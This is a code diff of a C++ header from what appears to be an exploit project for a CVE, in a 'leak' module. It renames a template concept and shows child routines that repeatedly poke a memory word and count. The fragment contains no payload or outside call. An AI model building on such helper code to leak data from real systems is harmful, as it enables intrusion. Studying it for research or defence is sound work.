@@ -17,7 +17,7 @@
 #include <cstddef>
 #include <cstdint>
 
-#include "backend/cve_2026_43499/leak/snitch_seam.hpp"
+#include "backend/cve_2026_43499/leak/snitch_ops.hpp"
 
 namespace ghostlock::backend::cve_2026_43499::leak {
     /** What one child is given: where to poke, where to count, and how much at a time. */
@@ -34,7 +34,7 @@ namespace ghostlock::backend::cve_2026_43499::leak {
 
     /** One poke: the count goes up and the word is touched, in that order. Returns false
      *  when the child has no word to touch, which is a caller mistake and not a poke. */
-    template <SnitchSeam Seam>
+    template <SnitchOps Seam>
     [[nodiscard]] bool poke_once(const ChildArgs &args) noexcept {
         if (args.word == nullptr || args.counter == nullptr) {
             return false;
@@ -49,7 +49,7 @@ namespace ghostlock::backend::cve_2026_43499::leak {
     }
 
     /** The child's whole job: keep poking until the stop word is set. */
-    template <SnitchSeam Seam>
+    template <SnitchOps Seam>
     void child_main(const ChildArgs &args) noexcept {
         while (args.stop != nullptr && *args.stop == 0U) {
             if (!poke_once<Seam>(args)) {
